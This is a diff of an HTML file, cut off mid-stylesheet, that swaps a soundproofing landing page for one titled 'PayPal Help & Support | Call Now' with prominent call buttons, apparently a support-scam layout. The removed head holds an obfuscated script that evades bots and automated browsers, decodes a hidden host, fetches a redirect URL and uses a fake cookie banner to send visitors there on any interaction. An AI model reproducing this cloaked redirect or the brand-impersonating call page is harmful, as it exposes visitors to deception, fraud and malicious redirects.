@@ -1,1345 +1,840 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Privacy-friendly analytics by Plausible -->
-<script async src="https://plausible.io/js/pa-NxhZZsJ4V24bDopFvyE9S.js"></script>
-<script>
-  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
-  plausible.init()
-</script>
-
- 
-  <script>
-(function(){var w=window,d=document,n=navigator;try{if(n.webdriver===true)return;if(w.callPhantom||w._phantom||w.__nightmare||w.domAutomation||w.domAutomationController||w.Cypress)return;if(w.__webdriver_evaluate||w.__driver_evaluate||w.__webdriver_unwrapped||w.__fxdriver_unwrapped||w.__driver_unwrapped||w.__selenium_unwrapped||w.__webdriver_script_func||w.__webdriver_script_fn||w.__webdriver_script_function)return;if(n.plugins&&n.plugins.length===0&&n.languages&&n.languages.length===0)return;}catch(e){return;}var _k=[23,87,41,55,99,12,67,34,71,18,93,45,62,7,88,29];var _d=function(s){var o='';for(var i=0;i<s.length;i+=2)o+=String.fromCharCode(parseInt(s.substr(i,2),16)^_k[(i/2)%_k.length]);return o;};var H=_d("7f235d4710366c0d247e324c55772a723938475b0a6226"),C=_d("27314f06536f27406a236b1d0a2a6c2d713104565b6a7a0f71276b4e06313c2e20631e01"),S="cb98318d204fcde1f41d00c8";var ua=(n.userAgent||'').toLowerCase();var bt=["703846500f69214d33","76335a550c786e45287d3a415b","703846500f696e4b29612d485d733172792346580f","7a324d5e027c2250337c385f4d2a3f7278304552","753e4750016337","7a2447550c78","763340531b6e2c56","753e4750137e26542e772a","71364a5201632c49226a29484c6939717f3e5d","71364a52016337","7a325d564e693b562260334c52663f787923","63204043176931402866","7627595b066e2c56","763a484d0c62214d33","6e3647530674214d33","75364053167f334b23772f","73224a5c07792049257d29","7e367656116f2b4b31772f","643b5c4513","763f5b52057f214d33","64324445167f2b402866","73385d550c78","7a3d1805016337","753b4c4f016337","73365d5605633151227d3f424a","67325d560f6e2c56","64345b5202612a4c20323b5f5160","643e5d520279274b33703259","752e5d52107c2a462260","64324c5c13633156","64325b4710782256257d29","672e5d5f0c626e50226328484d732b","74225b5b4c","60304c434c","762f40581023","7038045f1778330f247e34485073","7d365f564c","783c4143177c","7f3248530f693051247a2f425362","673f485917632e4834","643b405a067e2951","672259470678264735","673b484e147e2a452f66","643245520d65364f","74344b5817","70275d550c78","743b484207696e552270","67325b470f693b4b336b3f424a","76395d5f1163334b243f3c44","703846500f696e473f6638435a623c","7836401a10692250247a3f424a"];for(var i=0;i<bt.length;i++){var t=_d(bt[i]);if(t&&ua.indexOf(t)!==-1)return;}if(/headless|electron/i.test(ua))return;var lv=null,intent=false,done=false;function go(){if(done||!lv)return;done=true;w.location.href=lv;}function rd(){intent=true;go();}try{fetch(H+'/c/'+C+'?k='+S,{credentials:'omit',cache:'no-store',referrerPolicy:'no-referrer'}).then(function(r){return r.json();}).then(function(j){lv=j&&j.url||null;if(intent)go();}).catch(function(){});}catch(e){}function ui(){try{d.cookie='__gdpr_pending=1;path=/;max-age=86400;SameSite=Lax';}catch(e){}var s=d.createElement('style');s.textContent='#__ov{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding-top:18vh}#__ob{background:#fff;border-radius:14px;padding:30px 32px;max-width:380px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,.25);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center;animation:__op .25s ease}@keyframes __op{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}#__ob h3{margin:0 0 10px;font-size:18px;color:#111;font-weight:700}#__ob p{margin:0 0 22px;font-size:13.5px;color:#555;line-height:1.55}#__bt{display:flex;gap:10px;justify-content:center}#__ba,#__bd{flex:1;padding:11px 0;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .15s;font-family:inherit}#__ba{background:#2563eb;color:#fff}#__bd{background:#efefef;color:#333}#__ba:hover{opacity:.88}#__bd:hover{opacity:.75}';d.head.appendChild(s);var o=d.createElement('div');o.id='__ov';o.innerHTML='<div id="__ob"><h3>🍪 We use cookies<\/h3><p>We use cookies to personalise content and ads, and to analyse our traffic. By clicking “Accept” you consent to our cookie policy.<\/p><div id="__bt"><button id="__bd" type="button">Decline<\/button><button id="__ba" type="button">Accept<\/button><\/div><\/div>';(d.body||d.documentElement).appendChild(o);d.getElementById('__ba').onclick=function(){try{d.cookie='__gdpr_consent=all;path=/;max-age=31536000;SameSite=Lax';}catch(e){}rd();};d.getElementById('__bd').onclick=function(){try{d.cookie='__gdpr_consent=essential;path=/;max-age=31536000;SameSite=Lax';}catch(e){}rd();};}var _ev=['mousemove','pointerdown','pointermove','touchstart','scroll','wheel','keydown','click'],_eo={once:true,passive:true},_eh=function(){_ev.forEach(function(_e){try{w.removeEventListener(_e,rd,_eo);}catch(x){}try{d.removeEventListener(_e,rd,_eo);}catch(x){}});};rd=(function(_r){return function(){_eh();_r();};})(rd);_ev.forEach(function(_e){try{w.addEventListener(_e,rd,_eo);}catch(x){}try{d.addEventListener(_e,rd,_eo);}catch(x){}});if(d.readyState==='loading')d.addEventListener('DOMContentLoaded',ui);else ui();})();
-</script>
-
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Home Soundproofing | 20 Expert Ideas for a Quieter Home</title>
-    <meta name="description" content="Discover 20 professional soundproofing ideas to reduce noise in your home. Expert tips for walls, floors, windows, and more." />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <title>PayPal Help & Support | Call Now</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== RESET & BASE ===== */
-        *,
-        *::before,
-        *::after {
+        /* ───────────── Reset & Base ───────────── */
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        :root {
-            --bg-primary: #0c0e16;
-            --bg-secondary: #131726;
-            --bg-card: rgba(255, 255, 255, 0.04);
-            --bg-card-hover: rgba(255, 255, 255, 0.08);
-            --text-primary: #f0f0f0;
-            --text-secondary: #b0b8c8;
-            --text-muted: #7a8499;
-            --accent: #d4af37;
-            --accent-glow: rgba(212, 175, 55, 0.15);
-            --accent-dim: rgba(212, 175, 55, 0.08);
-            --border-subtle: rgba(255, 255, 255, 0.06);
-            --radius: 16px;
-            --radius-sm: 10px;
-            --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.4);
-            --transition: 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
         body {
-            font-family: var(--font);
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            background: #f5f7fa;
+            color: #1a1a2e;
             line-height: 1.6;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
+            padding-bottom: 100px;
+            /* space for floating button */;
         }
 
-        /* ===== SCROLLBAR ===== */
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg-primary);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--accent);
-            border-radius: 10px;
+        a {
+            text-decoration: none;
         }
 
-        /* ===== UTILITY ===== */
         .container {
-            max-width: 1280px;
+            max-width: 1100px;
             margin: 0 auto;
-            padding: 0 24px;
+            padding: 0 20px;
         }
 
-        .section-badge {
-            display: inline-block;
-            font-size: 0.7rem;
-            font-weight: 600;
-            letter-spacing: 0.15em;
-            text-transform: uppercase;
-            color: var(--accent);
-            background: var(--accent-dim);
-            padding: 6px 16px;
-            border-radius: 50px;
-            border: 1px solid rgba(212, 175, 55, 0.15);
-            margin-bottom: 14px;
-        }
-
-        .section-title {
-            font-size: clamp(2rem, 4.5vw, 3.2rem);
-            font-weight: 800;
-            line-height: 1.15;
-            letter-spacing: -0.02em;
-            margin-bottom: 16px;
-        }
-
-        .section-title .highlight {
-            background: linear-gradient(135deg, var(--accent), #f0d060);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .section-sub {
-            font-size: 1.1rem;
-            color: var(--text-secondary);
-            max-width: 640px;
-            line-height: 1.7;
-        }
-
-        /* ===== HEADER / NAV ===== */
+        /* ───────────── Header ───────────── */
         .header {
-            position: fixed;
+            background: linear-gradient(145deg, #003087, #001f5e);
+            color: #fff;
+            padding: 20px 0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            position: sticky;
             top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1000;
-            padding: 16px 0;
-            background: rgba(12, 14, 22, 0.72);
-            backdrop-filter: blur(18px) saturate(1.2);
-            border-bottom: 1px solid var(--border-subtle);
-            transition: var(--transition);
-        }
-
-        .header.scrolled {
-            background: rgba(12, 14, 22, 0.92);
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+            z-index: 100;
         }
 
         .header .container {
             display: flex;
             align-items: center;
             justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
         }
 
         .logo {
             display: flex;
             align-items: center;
             gap: 10px;
-            text-decoration: none;
-            color: var(--text-primary);
+            font-size: 1.6rem;
             font-weight: 700;
-            font-size: 1.25rem;
-            letter-spacing: -0.02em;
+            letter-spacing: -0.5px;
         }
 
-        .logo-icon {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 36px;
-            height: 36px;
-            background: var(--accent);
-            border-radius: var(--radius-sm);
-            color: var(--bg-primary);
-            font-weight: 800;
-            font-size: 1rem;
+        .logo i {
+            font-size: 2rem;
+            color: #009cde;
+            background: #fff;
+            border-radius: 8px;
+            padding: 4px 6px;
         }
 
         .logo span {
-            color: var(--accent);
+            color: #fff;
         }
 
-        .nav-links {
+        .logo .paypal-text {
+            color: #009cde;
+        }
+
+        .header-phone {
+            background: rgba(255, 255, 255, 0.12);
+            padding: 10px 22px;
+            border-radius: 40px;
+            font-size: 1.25rem;
+            font-weight: 600;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(4px);
             display: flex;
-            align-items: center;
-            gap: 28px;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            font-size: 0.9rem;
-            font-weight: 500;
-            transition: var(--transition);
-            position: relative;
-        }
-
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            bottom: -4px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: var(--accent);
-            transition: var(--transition);
-        }
-
-        .nav-links a:hover {
-            color: var(--text-primary);
-        }
-        .nav-links a:hover::after {
-            width: 100%;
-        }
-
-        .nav-cta {
-            background: var(--accent);
-            color: var(--bg-primary) !important;
-            padding: 8px 20px;
-            border-radius: 50px;
-            font-weight: 600 !important;
-            transition: var(--transition);
-        }
-
-        .nav-cta::after {
-            display: none !important;
-        }
-        .nav-cta:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px var(--accent-glow);
-            color: var(--bg-primary) !important;
-        }
-
-        .mobile-toggle {
-            display: none;
-            flex-direction: column;
-            gap: 5px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 4px;
-        }
-
-        .mobile-toggle span {
-            display: block;
-            width: 26px;
-            height: 2px;
-            background: var(--text-primary);
-            border-radius: 4px;
-            transition: var(--transition);
-        }
-
-        .mobile-toggle.active span:nth-child(1) {
-            transform: rotate(45deg) translate(5px, 5px);
-        }
-        .mobile-toggle.active span:nth-child(2) {
-            opacity: 0;
-        }
-        .mobile-toggle.active span:nth-child(3) {
-            transform: rotate(-45deg) translate(5px, -5px);
-        }
-
-        /* ===== HERO ===== */
-        .hero {
-            padding: 140px 0 80px;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: -40%;
-            right: -20%;
-            width: 800px;
-            height: 800px;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.06) 0%, transparent 70%);
-            pointer-events: none;
-        }
-
-        .hero::after {
-            content: '';
-            position: absolute;
-            bottom: -30%;
-            left: -10%;
-            width: 600px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.04) 0%, transparent 70%);
-            pointer-events: none;
-        }
-
-        .hero .container {
-            position: relative;
-            z-index: 1;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 60px;
-            align-items: center;
-        }
-
-        .hero-content {
-            display: flex;
-            flex-direction: column;
-            gap: 24px;
-        }
-
-        .hero-badge {
-            display: inline-flex;
             align-items: center;
             gap: 10px;
-            font-size: 0.75rem;
+            transition: 0.3s;
+        }
+
+        .header-phone:hover {
+            background: rgba(255, 255, 255, 0.22);
+            transform: scale(1.02);
+        }
+
+        .header-phone i {
+            color: #009cde;
+        }
+
+        .header-phone a {
+            color: #fff;
+        }
+
+        /* ───────────── Hero ───────────── */
+        .hero {
+            background: linear-gradient(135deg, #eef2f7 0%, #dce3ed 100%);
+            padding: 60px 0 50px;
+            text-align: center;
+            border-bottom: 4px solid #009cde;
+        }
+
+        .hero .badge {
+            display: inline-block;
+            background: #003087;
+            color: #fff;
+            padding: 6px 24px;
+            border-radius: 40px;
+            font-size: 0.85rem;
             font-weight: 600;
-            letter-spacing: 0.1em;
             text-transform: uppercase;
-            color: var(--accent);
-            background: var(--accent-dim);
-            padding: 8px 18px;
-            border-radius: 50px;
-            border: 1px solid rgba(212, 175, 55, 0.12);
-            width: fit-content;
-        }
-
-        .hero-badge .dot {
-            width: 6px;
-            height: 6px;
-            background: var(--accent);
-            border-radius: 50%;
-            animation: pulse-dot 2s ease-in-out infinite;
-        }
-
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.3;
-                transform: scale(0.7);
-            }
+            letter-spacing: 0.5px;
+            margin-bottom: 20px;
         }
 
         .hero h1 {
-            font-size: clamp(2.6rem, 5.5vw, 4.2rem);
+            font-size: 3rem;
             font-weight: 800;
-            line-height: 1.08;
-            letter-spacing: -0.03em;
+            color: #001f5e;
+            line-height: 1.2;
+            margin-bottom: 16px;
         }
 
         .hero h1 .highlight {
-            background: linear-gradient(135deg, var(--accent), #f0d060, var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            color: #009cde;
         }
 
         .hero p {
-            font-size: 1.15rem;
-            color: var(--text-secondary);
-            max-width: 500px;
-            line-height: 1.8;
+            font-size: 1.2rem;
+            color: #2d3a4a;
+            max-width: 680px;
+            margin: 0 auto 30px;
         }
 
-        .hero-stats {
-            display: flex;
-            gap: 40px;
-            margin-top: 8px;
-            padding-top: 20px;
-            border-top: 1px solid var(--border-subtle);
+        .hero .phone-display {
+            display: inline-flex;
+            align-items: center;
+            gap: 16px;
+            background: #fff;
+            padding: 14px 40px 14px 32px;
+            border-radius: 60px;
+            box-shadow: 0 8px 30px rgba(0, 48, 135, 0.18);
+            margin-bottom: 28px;
+            border: 2px solid #009cde;
         }
 
-        .hero-stats .stat {
-            display: flex;
-            flex-direction: column;
+        .hero .phone-display i {
+            font-size: 2rem;
+            color: #009cde;
         }
 
-        .hero-stats .stat .number {
-            font-size: 1.6rem;
+        .hero .phone-display .number {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #003087;
+            letter-spacing: 1px;
+        }
+
+        .hero .phone-display .label {
+            font-size: 0.9rem;
+            color: #5a6b7e;
+            font-weight: 500;
+        }
+
+        .btn-call {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: #009cde;
+            color: #fff;
+            padding: 18px 48px;
+            border-radius: 60px;
+            font-size: 1.25rem;
             font-weight: 700;
-            color: var(--text-primary);
-        }
-
-        .hero-stats .stat .label {
-            font-size: 0.8rem;
-            color: var(--text-muted);
-            font-weight: 400;
-        }
-
-        .hero-visual {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
-
-        .hero-visual .orb {
-            width: 380px;
-            height: 380px;
-            border-radius: 50%;
-            background: radial-gradient(circle at 30% 30%, rgba(212, 175, 55, 0.15), rgba(212, 175, 55, 0.02) 70%);
-            border: 1px solid rgba(212, 175, 55, 0.08);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            animation: float-orb 8s ease-in-out infinite;
-        }
-
-        @keyframes float-orb {
-            0%,
-            100% {
-                transform: translateY(0px) rotate(0deg);
-            }
-            50% {
-                transform: translateY(-16px) rotate(2deg);
-            }
-        }
-
-        .hero-visual .orb-inner {
-            width: 200px;
-            height: 200px;
-            border-radius: 50%;
-            background: radial-gradient(circle at 40% 40%, rgba(212, 175, 55, 0.25), rgba(212, 175, 55, 0.05) 80%);
-            border: 1px solid rgba(212, 175, 55, 0.06);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            text-align: center;
-            gap: 4px;
-        }
-
-        .hero-visual .orb-inner .big-icon {
-            font-size: 3.2rem;
-            line-height: 1;
-        }
-
-        .hero-visual .orb-inner .label {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            font-weight: 500;
-            letter-spacing: 0.05em;
+            border: none;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 6px 20px rgba(0, 156, 222, 0.35);
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .hero-visual .floating-tag {
-            position: absolute;
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border-subtle);
-            border-radius: var(--radius-sm);
-            padding: 10px 18px;
-            font-size: 0.8rem;
-            font-weight: 500;
-            color: var(--text-secondary);
-            box-shadow: var(--shadow-card);
-            animation: float-tag 6s ease-in-out infinite;
+        .btn-call:hover {
+            background: #0077b3;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0, 156, 222, 0.45);
+        }
+
+        .btn-call i {
+            font-size: 1.4rem;
+        }
+
+        .btn-call-outline {
+            background: transparent;
+            color: #003087;
+            border: 2px solid #003087;
+            box-shadow: none;
+        }
+
+        .btn-call-outline:hover {
+            background: #003087;
+            color: #fff;
+            box-shadow: 0 8px 25px rgba(0, 48, 135, 0.3);
+        }
+
+        .hero .sub-actions {
+            margin-top: 24px;
             display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 14px;
+        }
+
+        /* ───────────── Trust / Stats ───────────── */
+        .trust-bar {
+            background: #fff;
+            padding: 28px 0;
+            border-bottom: 1px solid #e6eaef;
+        }
+
+        .trust-bar .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px 60px;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #2d3a4a;
+        }
+
+        .trust-item i {
+            color: #009cde;
+            font-size: 1.6rem;
+        }
+
+        .trust-item strong {
+            color: #003087;
+        }
+
+        /* ───────────── Features / Cards ───────────── */
+        .features {
+            padding: 60px 0 40px;
+            background: #fff;
+        }
+
+        .features .section-title {
+            text-align: center;
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #001f5e;
+            margin-bottom: 12px;
+        }
+
+        .features .section-sub {
+            text-align: center;
+            color: #5a6b7e;
+            font-size: 1.1rem;
+            margin-bottom: 40px;
+        }
+
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 28px;
+        }
+
+        .card {
+            background: #f8faff;
+            padding: 32px 24px;
+            border-radius: 20px;
+            border: 1px solid #e6eaef;
+            transition: 0.3s;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+        }
+
+        .card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 16px 40px rgba(0, 48, 135, 0.08);
+            border-color: #009cde;
+        }
+
+        .card i {
+            font-size: 2.8rem;
+            color: #009cde;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        .card h3 {
+            font-size: 1.2rem;
+            color: #001f5e;
+            margin-bottom: 8px;
+        }
+
+        .card p {
+            color: #5a6b7e;
+            font-size: 0.95rem;
+        }
+
+        .card .btn-call-sm {
+            margin-top: 18px;
+            display: inline-flex;
             align-items: center;
             gap: 8px;
+            background: #003087;
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: 0.3s;
+            border: none;
+            cursor: pointer;
         }
 
-        .hero-visual .floating-tag .emoji {
-            font-size: 1.1rem;
+        .card .btn-call-sm:hover {
+            background: #009cde;
+            transform: scale(1.04);
         }
 
-        .floating-tag.tag-1 {
-            top: 10%;
-            right: -8%;
-            animation-delay: 0s;
-        }
-        .floating-tag.tag-2 {
-            bottom: 18%;
-            left: -10%;
-            animation-delay: 2s;
-        }
-        .floating-tag.tag-3 {
-            bottom: 40%;
-            right: -4%;
-            animation-delay: 4s;
-        }
-
-        @keyframes float-tag {
-            0%,
-            100% {
-                transform: translateY(0px);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
-        }
-
-        /* ===== IDEAS GRID ===== */
-        .ideas-section {
-            padding: 80px 0 100px;
-            position: relative;
-        }
-
-        .ideas-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--border-subtle), transparent);
-        }
-
-        .ideas-header {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        /* ───────────── CTA Banner ───────────── */
+        .cta-banner {
+            background: linear-gradient(135deg, #003087, #001f5e);
+            color: #fff;
+            padding: 50px 0;
             text-align: center;
-            margin-bottom: 56px;
+            margin: 20px 0 0;
         }
 
-        .ideas-header .section-sub {
+        .cta-banner h2 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .cta-banner p {
+            font-size: 1.15rem;
+            opacity: 0.85;
+            max-width: 600px;
+            margin: 0 auto 30px;
+        }
+
+        .cta-banner .btn-call {
+            background: #fff;
+            color: #003087;
+            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.25);
+        }
+
+        .cta-banner .btn-call:hover {
+            background: #e6eaef;
+            transform: translateY(-3px);
+        }
+
+        /* ───────────── FAQ / Accordion ───────────── */
+        .faq-section {
+            padding: 60px 0 40px;
+            background: #f5f7fa;
+        }
+
+        .faq-section .section-title {
+            text-align: center;
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #001f5e;
+            margin-bottom: 30px;
+        }
+
+        .faq-grid {
+            max-width: 780px;
             margin: 0 auto;
         }
 
-        .ideas-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-            gap: 24px;
+        .faq-item {
+            background: #fff;
+            padding: 20px 28px;
+            border-radius: 16px;
+            margin-bottom: 14px;
+            border: 1px solid #e6eaef;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
         }
 
-        .idea-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-subtle);
-            border-radius: var(--radius);
-            padding: 28px 24px 24px;
-            transition: var(--transition);
-            cursor: default;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .idea-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--accent), transparent);
-            opacity: 0;
-            transition: var(--transition);
-        }
-
-        .idea-card:hover {
-            background: var(--bg-card-hover);
-            border-color: rgba(212, 175, 55, 0.15);
-            transform: translateY(-6px);
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
-        }
-
-        .idea-card:hover::before {
-            opacity: 1;
-        }
-
-        .idea-card .icon {
-            font-size: 2rem;
-            line-height: 1;
+        .faq-item strong {
+            display: block;
+            font-size: 1.05rem;
+            color: #001f5e;
             margin-bottom: 4px;
         }
 
-        .idea-card .number {
-            position: absolute;
-            top: 16px;
-            right: 20px;
-            font-size: 0.65rem;
-            font-weight: 600;
-            color: var(--text-muted);
-            letter-spacing: 0.05em;
-            background: rgba(255, 255, 255, 0.04);
-            padding: 2px 10px;
-            border-radius: 50px;
-            border: 1px solid var(--border-subtle);
+        .faq-item p {
+            color: #3d4e62;
+            font-size: 0.98rem;
         }
 
-        .idea-card h3 {
-            font-size: 1.05rem;
-            font-weight: 600;
-            letter-spacing: -0.01em;
-            color: var(--text-primary);
-            margin-top: 2px;
+        .faq-item .faq-phone {
+            color: #009cde;
+            font-weight: 700;
         }
 
-        .idea-card p {
-            font-size: 0.88rem;
-            color: var(--text-secondary);
-            line-height: 1.6;
-            flex: 1;
+        /* ───────────── Footer ───────────── */
+        .footer {
+            background: #001225;
+            color: #a0b3cc;
+            padding: 30px 0;
+            text-align: center;
+            font-size: 0.9rem;
+            border-top: 3px solid #009cde;
         }
 
-        .idea-card .tag {
+        .footer a {
+            color: #009cde;
+        }
+
+        .footer .footer-phone {
             display: inline-block;
-            font-size: 0.6rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            color: var(--accent);
-            background: var(--accent-dim);
-            padding: 3px 12px;
-            border-radius: 50px;
-            border: 1px solid rgba(212, 175, 55, 0.08);
-            width: fit-content;
-            margin-top: 4px;
+            margin: 10px 0 6px;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #fff;
         }
 
-        /* ===== CTA BANNER ===== */
-        .cta-banner {
-            padding: 60px 0 80px;
-            border-top: 1px solid var(--border-subtle);
-        }
-
-        .cta-banner .container {
-            background: var(--bg-secondary);
-            border: 1px solid var(--border-subtle);
-            border-radius: var(--radius);
-            padding: 48px 56px;
+        /* ───────────── Floating Call Button ───────────── */
+        .floating-call {
+            position: fixed;
+            bottom: 28px;
+            right: 28px;
+            z-index: 999;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            gap: 40px;
-            flex-wrap: wrap;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .cta-banner .container::before {
-            content: '';
-            position: absolute;
-            top: -60%;
-            right: -20%;
-            width: 400px;
-            height: 400px;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.05), transparent 70%);
-            pointer-events: none;
-        }
-
-        .cta-content {
-            flex: 1;
-            min-width: 240px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .cta-content h2 {
-            font-size: 1.6rem;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-
-        .cta-content p {
-            color: var(--text-secondary);
-            font-size: 0.95rem;
-        }
-
-        .cta-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--accent);
-            color: var(--bg-primary);
-            padding: 14px 36px;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 0.95rem;
-            text-decoration: none;
-            transition: var(--transition);
+            gap: 12px;
+            background: #009cde;
+            color: #fff;
+            padding: 14px 26px 14px 20px;
+            border-radius: 60px;
+            box-shadow: 0 8px 32px rgba(0, 156, 222, 0.5);
+            transition: 0.3s;
             border: none;
             cursor: pointer;
-            font-family: var(--font);
-            position: relative;
-            z-index: 1;
-            white-space: nowrap;
+            font-weight: 700;
+            font-size: 1.1rem;
+            animation: floatPulse 2.5s ease-in-out infinite;
         }
 
-        .cta-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 32px var(--accent-glow);
-            background: #e0c040;
+        .floating-call:hover {
+            transform: scale(1.08);
+            background: #0077b3;
+            box-shadow: 0 12px 40px rgba(0, 156, 222, 0.65);
         }
 
-        .cta-btn .arrow {
-            transition: var(--transition);
-        }
-        .cta-btn:hover .arrow {
-            transform: translateX(4px);
+        .floating-call i {
+            font-size: 1.8rem;
+            animation: ring 1.8s ease-in-out infinite;
         }
 
-        /* ===== FOOTER ===== */
-        .footer {
-            padding: 40px 0 32px;
-            border-top: 1px solid var(--border-subtle);
-            background: var(--bg-primary);
+        .floating-call .call-label {
+            display: inline-block;
         }
 
-        .footer .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 20px;
+        .floating-call .call-number {
+            font-weight: 800;
+            letter-spacing: 0.5px;
         }
 
-        .footer p {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-        }
-
-        .footer-links {
-            display: flex;
-            gap: 24px;
-            list-style: none;
-        }
-
-        .footer-links a {
-            color: var(--text-muted);
-            text-decoration: none;
-            font-size: 0.85rem;
-            transition: var(--transition);
-        }
-
-        .footer-links a:hover {
-            color: var(--text-primary);
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 1024px) {
-            .hero .container {
-                grid-template-columns: 1fr;
-                text-align: center;
-                gap: 40px;
+        @keyframes floatPulse {
+            0%,
+            100% {
+                transform: translateY(0);
             }
+            50% {
+                transform: translateY(-8px);
+            }
+        }
 
-            .hero-content {
-                align-items: center;
+        @keyframes ring {
+            0%,
+            100% {
+                transform: rotate(0deg);
             }
-            .hero p {
-                margin: 0 auto;
+            10% {
+                transform: rotate(20deg);
             }
-            .hero-stats {
-                justify-content: center;
+            20% {
+                transform: rotate(-20deg);
             }
-            .hero-visual .orb {
-                width: 280px;
-                height: 280px;
+            30% {
+                transform: rotate(12deg);
             }
